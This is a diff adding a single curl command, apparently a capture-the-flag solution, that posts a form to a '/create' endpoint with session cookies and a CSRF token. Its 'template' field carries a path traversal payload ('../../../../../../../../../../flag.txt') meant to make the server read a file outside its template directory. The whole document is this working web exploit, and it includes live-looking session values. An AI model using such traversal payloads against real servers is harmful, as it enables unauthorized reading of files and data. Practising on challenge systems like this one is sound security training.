@@ -1,0 +1,7 @@
+curl --location 'https://web.kazet.cc:42448/create' \
+--header 'Cookie: csrftoken=hUx4TMjd7B88OhRkIsJtffjObqkChtcu; sessionid=9535cp80pn54a5j8q6wb4pil4heyd2a7' \
+--header 'Content-Type: application/x-www-form-urlencoded' \
+--data-urlencode 'csrfmiddlewaretoken=lg91AaVdvYLyXOhxfIVU9SMdhe1x6ufHs0wVjM4gspJwBVYHN0udeXVRiubZdNh1' \
+--data-urlencode 'recipient=hubi' \
+--data-urlencode 'content=xd' \
+--data-urlencode 'template=../../../../../../../../../../flag.txt'
